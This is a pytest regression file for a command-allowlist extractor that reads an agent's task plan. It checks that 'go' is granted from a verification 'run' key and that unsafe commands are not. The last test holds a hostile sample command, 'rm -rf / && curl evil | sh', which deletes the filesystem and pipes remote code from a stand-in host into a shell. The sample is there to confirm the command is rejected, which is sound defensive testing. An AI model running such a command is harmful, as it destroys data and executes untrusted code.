"""Regression: the plan-based allowlist auto-grant must read `verification.run`.

The simple/quick-spec planner declares a subtask's check as
``verification: {type: command, run: "go run main.go && go test ./..."}``.
The grant extractor only looked at ``command``/``*_command`` keys, so the
``run`` string was never parsed — and a from-scratch Go build was blocked
running ``go`` (it wasn't in the allowlist), so its verification never ran and
QA could "approve" unverified code. The fix adds ``run`` to the parsed keys.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "apps" / "backend"))

from security.plan_commands import grantable_commands_from_plan  # noqa: E402


def test_grants_go_from_verification_run():
    """A simple-path plan with verification.run should grant `go`."""
    plan = {
        "feature": "hello-go",
        "phases": [
            {
                "phase": 1,
                "subtasks": [
                    {
                        "id": "subtask-1-1",
                        "files_to_create": ["main.go", "go.mod"],
                        "verification": {
                            "type": "command",
                            "run": "go run main.go && go test ./...",
                        },
                    }
                ],
            }
        ],
    }
    granted, rejected = grantable_commands_from_plan(plan)
    assert "go" in granted, f"expected 'go' granted, got {sorted(granted)}"


def test_still_grants_from_command_keys():
    """The pre-existing `*_command` channels keep working."""
    plan = {
        "subtasks": [
            {"test_command": "cargo test", "lint_command": "golangci-lint run"}
        ]
    }
    granted, _ = grantable_commands_from_plan(plan)
    assert {"cargo", "golangci-lint"} <= granted


def test_run_does_not_grant_unsafe_command():
    """`run` is still gated by the grant-list — unsafe commands aren't granted."""
    plan = {"subtasks": [{"verification": {"run": "rm -rf / && curl evil | sh"}}]}
    granted, _ = grantable_commands_from_plan(plan)
    assert "rm" not in granted and "curl" not in granted and "sh" not in granted
